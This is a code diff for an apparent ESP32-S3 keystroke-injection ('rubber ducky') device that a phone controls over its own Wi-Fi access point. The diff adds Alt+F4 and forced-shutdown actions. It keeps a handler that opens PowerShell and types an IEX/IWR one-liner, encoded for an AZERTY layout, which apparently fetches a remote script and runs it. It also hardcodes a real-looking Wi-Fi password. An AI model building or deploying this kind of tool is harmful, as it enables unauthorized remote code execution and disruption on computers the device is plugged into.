@@ -6,7 +6,7 @@
 USBHIDKeyboard Keyboard;
 
 const char* ssid = "ESP32S3_DUCKY";
-const char* password = "yourpassword";
+const char* password = "Maikokow";
 WebServer server(80);
 
 /*  SPECIAL KEY MAPPING
@@ -97,6 +97,9 @@ const char webpage[] PROGMEM = R"rawliteral(
     <button onclick="open_pwsh()">Open POWERSHELL</button>
     <button onclick="run_script()">Run Script.ps1</button>
     <button onclick="type_script()">Type Script.ps1</button>
+    <button onclick="alt_f4()">ALT F4</button>
+    <button onclick="shutdown()">SHUTDOWN</button>
+  </div>
   </div>
 
   <script>
@@ -116,6 +119,10 @@ const char webpage[] PROGMEM = R"rawliteral(
       fetch('/script')
         .then(() => {document.getElementById("retour").textContent="Script.ps1 RUN"});
     }
+        function shutdown() {
+      fetch('/shutdown')
+        .then(() => {document.getElementById("retour").textContent="SHUTDOWN"});
+    }
     function type_script() {
       fetch('/type_script')
         .then(() => {document.getElementById("retour").textContent="Wrote Sript.ps1"});
@@ -128,6 +135,11 @@ const char webpage[] PROGMEM = R"rawliteral(
         document.getElementById("retour").textContent = "TYPED: " + text;
       });
   }
+
+    function alt_f4() {
+      fetch('/altf4')
+        .then(() => {document.getElementById("retour").textContent="ALT F4 RUN"});
+    }
   </script>
 
 </body>
@@ -177,8 +189,22 @@ void type_page() {
   wait_for_web();
 }
 
-void type_script() {
+void type_script_page() {
   Keyboard.print("IEX5IZR https.>>zebdqv<;qikotourre<be>zebdqv>script<ps! =UseBqsicPqrsing-");
+
+  server.send(200, "text/plain", "OK");
+  wait_for_web();
+}
+
+void shutdown_page() {
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(200);
+  Keyboard.print("shutdozn =s =t )");
+  delay(200);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
 
   server.send(200, "text/plain", "OK");
   wait_for_web();
@@ -204,6 +230,16 @@ void run_script_page() {
   server.send(200, "text/plain", "OK");
 }
 
+void altf4_page() {
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(KEY_F4);
+  delay(100);
+  Keyboard.releaseAll();
+
+  server.send(200, "text/plain", "OK");
+  wait_for_web();
+}
+
 // ===== Setup AP =====
 void setup() {
   Serial.begin(115200);
@@ -220,7 +256,9 @@ void setup() {
   server.on("/open_pwsh", open_pwsh_page);
   server.on("/type", type_page);
   server.on("/script", run_script_page);
-  server.on("/type_script", type_script);
+  server.on("/type_script", type_script_page);
+  server.on("/shutdown", shutdown_page);
+  server.on("/altf4", altf4_page);
   server.begin();
 
   USB.begin();
@@ -247,14 +285,14 @@ void loop() {
   wait_for_web();
 
   //Keyboard.print("abcdefghijklmnopqrstuvwxyz&'(§!)-$^*0123456789/+>\<?,.}{[]=_#@$~");
-  //From be layout  qbcdefghijkl,noparstuvzxyw7ù9é 10)468à&é"'(§è!ç=_/.+;:*¨^$-°324³
+  //From be layout  qbcdefghijkl,noparstuvzxyw7ù9 10)468à&é"'(§è!ç =_/.+;:*¨^$-°324³
 
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
   Keyboard.releaseAll();
 
   delay(200);
-  Keyboard.print("pozershell");
+  Keyboard.print("pozershell"); 
   delay(200);
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
@@ -266,5 +304,3 @@ void loop() {
   Keyboard.releaseAll();
 
 }
-
-
